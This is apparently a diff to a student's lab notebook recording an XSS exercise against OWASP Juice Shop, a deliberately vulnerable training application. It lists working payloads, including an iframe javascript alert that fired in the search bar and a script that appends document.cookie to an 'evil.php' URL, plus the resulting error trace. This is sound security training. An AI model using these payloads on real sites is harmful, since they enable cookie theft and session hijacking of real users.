@@ -1,6 +1,46 @@
 # Lab Notebook
 - **Student Name:** Siham Bashir Ali
 - **Student ID:** ALI22603020
-- **Lab:** Setting up OWASP Juice Shop Environment
+- **Lab:** Exploiting XSS on OWASP Juice Shop
 - **Date:** 08/2/2024
+
+## Exploiting XSS Vulnerability
+
+1. **Identified Input Points:**
+   - Search bar on [https://pwning.owasp-juice.shop/part2/xss.html](https://pwning.owasp-juice.shop/part2/xss.html).
+   - User profile fields, such as the bio.
+
+2. **Crafted Malicious Payloads:**
+   - Prepared payloads including `<script>alert('XSS')</script>`.
+
+3. **Injected Payloads:**
+   - Injected payloads into the search bar and user profile bio.
+   - Search bar
+     <iframe src="javascript:alert('xss')"></iframe>
+   - User Profile Bio in Username
+    <SCRIPT type="text/javascript">
+var adr = '../evil.php?cakemonster=' + escape(document.cookie);
+</SCRIPT>
+
+4. **Observed Effects:**
+   - Search bar
+   - Payload executed successfully in the search bar, triggering an alert.
+   - Output is : 
+     XSS
+
+   - Attempted payload in the user profile bio had no effect.
+
+5. **Captured Exploitation Process:**
+   - Recorded step-by-step process of successful XSS execution.
+Click on the searchbar and insert the code: <iframe src="javascript:alert('xss')"></iframe>
+This will prompt an alert with the output xss and a button with the words (OK) on it.
+   - Documented unsuccessful attempts and error messages.
+
+OWASP Juice Shop (Express ^4.17.1)
+500 Error: Blocked illegal activity by ::ffff:192.168.123.10
+
+       at /home/student/juice-shop/build/routes/userProfile.js:69:22
+       at /home/student/juice-shop/node_modules/graceful-fs/graceful-fs.js:123:16
+       at FSReqCallback.readFileAfterClose [as oncomplete] (node:internal/fs/read_file_context:68:3)
+
 
